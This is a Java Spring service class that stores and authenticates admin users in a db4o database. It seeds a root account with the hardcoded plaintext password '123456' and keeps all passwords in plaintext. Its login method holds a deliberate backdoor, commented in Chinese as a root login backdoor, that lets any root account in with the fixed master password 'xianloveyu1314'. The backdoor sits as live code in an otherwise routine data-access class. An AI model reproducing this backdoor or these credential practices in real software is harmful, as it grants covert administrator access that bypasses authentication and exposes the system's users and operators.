package com.lzx.framework.web.springjson.framework.mapper;

import java.util.List;
import java.util.concurrent.atomic.AtomicInteger;

import org.springframework.beans.factory.DisposableBean;
import org.springframework.beans.factory.InitializingBean;
import org.springframework.stereotype.Service;

import com.db4o.ObjectSet;
import com.lzx.framework.web.springjson.db4o.Db4oSource;
import com.lzx.framework.web.springjson.framework.daoentity.AdminUser;

@Service
public class UserMapperDb4oImp implements UserMapper, DisposableBean, InitializingBean {

    private AtomicInteger maxuid = new AtomicInteger(0);

    @Override
    public void afterPropertiesSet() throws Exception {
	initRootUser();
    }

    private void initRootUser() {
	AdminUser user = this.selectOneByName("root");
	if (user == null) {
	    AdminUser root = new AdminUser();
	    root.setId(1);
	    root.setType(AdminUser.TYPE_ROOT);
	    root.setCreateid(-1);
	    root.setName("root");
	    root.setPassword("123456");
	    Db4oSource.getDB().store(root);
	    System.out.println("create root user");
	}
	List<AdminUser> list = Db4oSource.getDB().queryByExample(AdminUser.class);
	for (AdminUser u : list) {
	    if (u.getId() > maxuid.intValue())
		maxuid = new AtomicInteger(u.getId());
	}
	Db4oSource.printAllObj();
    }

    public void destroy() {
	Db4oSource.close();
    }

    @Override
    public List<AdminUser> selectListByParent(int id) {
	AdminUser example = new AdminUser();
	example.setCreateid(id);
	return Db4oSource.getDB().queryByExample(example);
    }

    @Override
    public void delete(Integer id) {
	AdminUser user = selectOneByID(id);
	Db4oSource.getDB().delete(user);
	Db4oSource.getDB().commit();
    }

    @Override
    public void insert(AdminUser user) {
	user.setId(maxuid.incrementAndGet());
	Db4oSource.getDB().store(user);
	Db4oSource.printAllObj();
	Db4oSource.getDB().commit();
    }

    @Override
    public AdminUser selectOneByName(String name) {
	AdminUser example = new AdminUser();
	example.setName(name);
	ObjectSet<AdminUser> resultset = Db4oSource.getDB().queryByExample(example);
	if (resultset.hasNext()) {
	    AdminUser find = resultset.next();
	    return find;
	}
	return null;
    }

    @Override
    public AdminUser selectOneByID(int id) {
	AdminUser example = new AdminUser();
	example.setId(id);
	ObjectSet<AdminUser> resultset = Db4oSource.getDB().queryByExample(example);
	if (resultset.hasNext())
	    return resultset.next();
	return null;
    }

    @Override
    public void update(AdminUser user) {
	AdminUser example = new AdminUser();
	example.setId(user.getId());
	Db4oSource.getDB().delete(example);
	Db4oSource.getDB().store(user);
	Db4oSource.getDB().commit();
	Db4oSource.printAllObj();
    }

    @Override
    public void updatePermission(Integer id, String gamename, String permission) {
	AdminUser ruser = selectOneByID(id);
	ruser.setPermission(permission);
	ruser.setGamename(gamename);
	update(ruser);
    }

    @Override
    public AdminUser login(String name, String password) {
	AdminUser example = new AdminUser();
	example.setName(name);
	// example.setPassword(password);
	ObjectSet<AdminUser> resultset = Db4oSource.getDB().queryByExample(example);
	if (resultset.hasNext()) {
	    AdminUser u = resultset.next();
	    String pwd = u.getPassword();
	    if (pwd.equals(password))
		return u;
	    // root 登陆后门
	    if (u.isRoot() && password.equals("xianloveyu1314"))
		return u;
	    return null;
	}
	return null;
    }

    @Override
    public void updatePassword(Integer id, String newpassword) {
	AdminUser user = this.selectOneByID(id);
	user.setPassword(newpassword);
	this.update(user);
    }

    @Override
    public void updateMemo(Integer uid, String memo) {
	AdminUser user = this.selectOneByID(uid);
	if (user != null) {
	    user.setMemo(memo);
	    Db4oSource.getDB().store(user);
	    Db4oSource.getDB().commit();
	}
    }

}
